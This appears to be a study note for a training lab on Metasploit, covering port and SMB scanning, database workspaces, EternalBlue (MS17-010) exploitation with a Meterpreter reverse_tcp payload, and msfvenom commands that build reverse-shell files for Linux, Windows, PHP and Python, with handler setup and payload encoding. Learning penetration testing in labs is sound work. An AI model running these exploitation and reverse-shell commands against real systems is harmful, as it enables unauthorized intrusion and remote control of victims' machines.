
# Metasploit: Exploitation

## Port Scanning Modules
Use the `search portscan` command to list available port scanning modules.

**Examples of Port Scanning Modules:**
- `auxiliary/scanner/portscan/tcp`: TCP Port Scanner
- `auxiliary/scanner/portscan/syn`: TCP SYN Port Scanner
- `auxiliary/scanner/portscan/xmas`: TCP "XMas" Port Scanner
- `auxiliary/scanner/portscan/ack`: TCP ACK Firewall Scanner

**Set Options for Scanning:**
```plaintext
msf6 auxiliary(scanner/portscan/tcp) > show options
```
Key options:
- **CONCURRENCY**: Number of ports to scan per host.
- **PORTS**: Port range (e.g., `1-10000`).
- **RHOSTS**: Target host(s).
- **THREADS**: Number of concurrent threads.

**Example Command:**
```plaintext
msf6 > nmap -sS 10.10.12.229
```

---

## UDP Service Identification
The `auxiliary/scanner/discovery/udp_sweep` module identifies services running over UDP.
```plaintext
msf6 auxiliary(scanner/discovery/udp_sweep) > run
```

---

## SMB Scans
Scan for SMB services using modules like `smb_enumshares` or `smb_version`.

**Example:**
```plaintext
msf6 auxiliary(scanner/smb/smb_version) > run
```

---

## Metasploit Database Features
Metasploit can use a database for project management.

1. **Start PostgreSQL and Initialize the Database:**
    ```plaintext
    systemctl start postgresql
    msfdb init
    ```

2. **Check Database Status:**
    ```plaintext
    msf6 > db_status
    ```

3. **Use Workspaces to Organize Projects:**
    - List Workspaces:
      ```plaintext
      msf6 > workspace
      ```
    - Add a Workspace:
      ```plaintext
      msf6 > workspace -a <workspace_name>
      ```
    - Switch Workspaces:
      ```plaintext
      msf6 > workspace <workspace_name>
      ```

---

## Using the Database for Scans
- **Run a Scan and Save Results:**
    ```plaintext
    msf6 > db_nmap -sV -p- 10.10.12.229
    ```

- **Query Hosts and Services:**
    ```plaintext
    msf6 > hosts
    msf6 > services
    ```

- **Set RHOSTS Using Saved Hosts:**
    ```plaintext
    msf6 > hosts -R
    ```

---

## Vulnerability Scanning Example
1. Use the `auxiliary/scanner/smb/smb_ms17_010` module.
2. Set RHOSTS using `hosts -R`.
3. Launch the scan:
    ```plaintext
    msf6 > run
    ```

---

## Querying for Specific Services
Find specific services using:
```plaintext
msf6 > services -S <service_name>
```

---

## Additional Notes
- **Low-Hanging Fruits:** Look for:
  - HTTP (web apps with vulnerabilities like SQLi or RCE)
  - FTP (anonymous login)
  - SMB (exploits like MS17-010)
  - SSH (default credentials)
  - RDP (weak credentials or exploits like BlueKeep)

- **Search for Modules by Service:**
    ```plaintext
    msf6 > use auxiliary/scanner/<service>/
    ```

**Example: VNC Login Module**
```plaintext
msf6 > use auxiliary/scanner/vnc/vnc_login
msf6 auxiliary(scanner/vnc/vnc_login) > info
```

## Exploits and Payloads with Metasploit

## Overview
Metasploit is primarily an exploitation framework with various modules:
- **Exploits:** 2048
- **Auxiliary:** 1105
- **Post:** 344
- **Payloads:** 562
- **Encoders:** 45
- **Evasions:** 7

You can search exploits using the `search` command, view details with the `info` command, and launch them using `exploit`. Many exploits have default payloads but can be customized with the `set payload` command.

---

## Available Payloads
Example of listing payloads for `ms17_010_eternalblue`:
```plaintext
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
```
Common payloads include:
- **generic/shell_reverse_tcp:** Reverse TCP Shell
- **windows/x64/meterpreter/reverse_tcp:** Windows Meterpreter Reverse TCP

---

## Example: MS17-010 Exploitation
1. **Set Payload:**
    ```plaintext
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
    ```

2. **Set Required Options:**
    - **LHOST:** Attack machine's IP address.
    - **LPORT:** Listening port.

3. **Run Exploit:**
    ```plaintext
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.186.44
    msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
    ```

4. **Background or Abort Sessions:** Use `CTRL+Z` or `CTRL+C`.

5. **Manage Active Sessions:**
    ```plaintext
    msf6 > sessions -h
    msf6 > sessions -i <session_id>
    ```

---

## Payload Generation with Msfvenom
**Generate Payloads in Different Formats:**
```plaintext
msfvenom -p <payload> LHOST=<attacker_IP> LPORT=<port> -f <format> > <output_file>
```

### Common Examples:
- **Linux ELF:** `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
- **Windows EXE:** `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
- **PHP:** `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
- **Python:** `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`

---

## Example Workflow: PHP Reverse Shell
1. **Generate Payload:**
    ```plaintext
    msfvenom -p php/reverse_php LHOST=10.10.186.44 LPORT=7777 -f raw > reverse_shell.php
    ```
    - Edit the file to add the PHP tags (`<?php` and `?>`).

2. **Set Up Multi/Handler Listener:**
    ```plaintext
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload php/reverse_php
    msf6 exploit(multi/handler) > set lhost 10.10.186.44
    msf6 exploit(multi/handler) > set lport 7777
    msf6 exploit(multi/handler) > run
    ```

3. **Trigger the Reverse Shell:** Upload and execute the payload on the target.

---

## Output Formats and Encoders
- Use `msfvenom --list formats` to view supported output formats.
- Use encoders with the `-e` flag for additional encoding, e.g.:
    ```plaintext
    msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw -e php/base64
    ```

---

## Handlers
- Reverse shells require a handler to catch connections:
    ```plaintext
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload <payload>
    msf6 exploit(multi/handler) > set lhost <attacker_IP>
    msf6 exploit(multi/handler) > set lport <port>
    msf6 exploit(multi/handler) > run
    ```

Metasploit's multi/handler module supports all payloads and is essential for handling reverse connections.
